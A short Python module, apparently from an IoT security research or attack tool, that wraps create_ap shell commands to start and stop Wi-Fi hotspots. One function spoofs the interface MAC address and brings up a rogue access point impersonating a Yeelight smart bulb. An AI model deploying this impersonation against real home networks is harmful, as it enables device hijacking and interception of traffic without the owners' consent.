import os

def create_hotspot(iface, ssid, password):
    create_hotspot_cmd = f"sudo create_ap {iface} enp0s25 {ssid} {password} --no-virt"
    try:
        if os.system(create_hotspot_cmd) != 0:
            raise OSError
    except OSError:
        pass
    else:
        return True

def create_malicious_yeelight(iface, ssid, gateway_ip, new_mac):
    iface_down_cmd = f"sudo ifconfig {iface} down"
    iface_change_mac_cmd = f"sudo ifconfig {iface} hw ether {new_mac}"
    iface_up_cmd = f"sudo ifconfig {iface} up"
    create_malicious_yeelight_cmd = f"create_ap -c 10 -g {gateway_ip} -n {iface} {ssid} --no-virt"
    os.system(iface_down_cmd)
    os.system(iface_change_mac_cmd)
    os.system(iface_up_cmd)
    try:
        if os.system(create_malicious_yeelight_cmd) != 0:
            raise OSError
    except OSError:
        pass
    else:
        return True

def stop_hotspot(iface):
    stop_hotspot_cmd = f"sudo create_ap --stop {iface}"
    try:
        if os.system(stop_hotspot_cmd) != 0:
            raise OSError
    except OSError:
        pass
    else:
        return True
